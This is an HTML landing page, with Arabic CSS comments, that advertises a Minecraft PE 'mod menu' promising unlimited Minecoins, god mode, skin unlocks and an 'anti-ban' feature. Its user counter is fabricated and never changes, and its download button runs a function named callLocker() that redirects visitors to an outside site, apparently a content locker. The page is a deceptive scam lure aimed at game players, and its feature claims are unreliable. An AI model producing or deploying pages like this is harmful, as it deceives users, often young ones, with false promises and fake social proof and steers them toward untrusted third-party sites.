<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft PE Mod Menu v1.21</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Rajdhani:wght@600&display=swap" rel="stylesheet">
    
    <style>
        /* إعدادات الصفحة للسماح بالتحريك */
        * {
            box-sizing: border-box;
        }

        body, html {
            margin: 0;
            padding: 0;
            min-height: 100vh; /* يسمح للصفحة بأن تطول حسب المحتوى */
            font-family: 'Montserrat', sans-serif;
            background-color: #050505;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start; /* يبدأ من الأعلى للسماح بالسكرول */
            overflow-y: auto; /* هذا هو الحل لمشكلة التجميد */
            -webkit-overflow-scrolling: touch;
        }

        /* الخلفية الثابتة */
        .background-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.85)), 
                              url('https://wallpaperaccess.com/full/1121375.jpg');
            background-size: cover;
            background-position: center;
            z-index: -1;
        }

        /* حاوية المحتوى المركزية */
        .main-card {
            background: rgba(15, 15, 15, 0.95);
            width: 90%;
            max-width: 450px;
            padding: 30px 20px;
            border-radius: 20px;
            border: 2px solid #52ba10;
            text-align: center;
            box-shadow: 0 0 40px rgba(82, 186, 16, 0.2);
            backdrop-filter: blur(10px);
            margin: 40px auto; /* مسافة من الأعلى والأسفل */
        }

        /* اللوجو */
        .logo {
            width: 140px;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 10px rgba(255, 204, 0, 0.3));
        }

        h1 {
            font-size: 1.6rem;
            margin: 5px 0;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .version-badge {
            display: inline-block;
            background: #ffcc00;
            color: #000;
            padding: 5px 15px;
            border-radius: 5px;
            font-size: 0.8rem;
            font-weight: 900;
            margin-bottom: 25px;
        }

        /* قائمة المميزات */
        .features-box {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: left;
            border-left: 4px solid #52ba10;
        }

        .feature-item {
            display: flex;
            align-items: center;
            margin: 12px 0;
            font-family: 'Rajdhani', sans-serif;
            font-size: 1.2rem;
            color: #e0e0e0;
        }

        .feature-item span {
            color: #52ba10;
            margin-right: 12px;
            font-weight: bold;
        }

        /* عداد المستخدمين المتصلين */
        .live-status {
            color: #00ff00;
            font-size: 0.9rem;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .dot {
            height: 10px;
            width: 10px;
            background-color: #00ff00;
            border-radius: 50%;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        /* زر التحميل المتحرك */
        .download-button {
            background: linear-gradient(135deg, #52ba10 0%, #3e8e0c 100%);
            color: white;
            border: none;
            width: 100%;
            padding: 20px;
            font-size: 1.4rem;
              font-weight: 900;
            border-radius: 50px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
            animation: pulse-green 2s infinite;
        }

        .download-button:hover {
            transform: scale(1.03);
            box-shadow: 0 0 30px rgba(82, 186, 16, 0.6);
        }

        @keyframes pulse-green {
            0% { box-shadow: 0 0 0 0 rgba(82, 186, 16, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(82, 186, 16, 0); }
            100% { box-shadow: 0 0 0 0 rgba(82, 186, 16, 0); }
        }

        .footer-text {
            margin-top: 25px;
            font-size: 0.7rem;
            color: #666;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="background-overlay"></div>

    <div class="main-card">
        <img src="https://cdn.freebiesupply.com/logos/large/2x/minecraft-logo-black-and-white.png" alt="Minecraft Logo" class="logo">
        
        <h1>Minecraft PE Mod</h1>
        <div class="version-badge">v1.21.101 - ANTI-BAN ACTIVE</div>

        <div class="features-box">
            <div class="feature-item"><span>✓</span> Unlimited Minecoins</div>
            <div class="feature-item"><span>✓</span> God Mode & Fly Hack</div>
            <div class="feature-item"><span>✓</span> All Skins Unlocked</div>
            <div class="feature-item"><span>✓</span> Speed & High Jump</div>
        </div>

        <div class="live-status">
            <span class="dot"></span>
            <span>1,842 Users downloading now...</span>
        </div>

        <button class="download-button" onclick="callLocker()">
            Download Now
        </button>

        <div class="footer-text">
            © 2026 Minecraft Modding Community
        </div>
    </div>

    <script type="text/javascript">
        function callLocker() {
            window.location.href = "https://appchecker.space/cl/i/1x33lx";
        }
    </script>

</body>
</html>
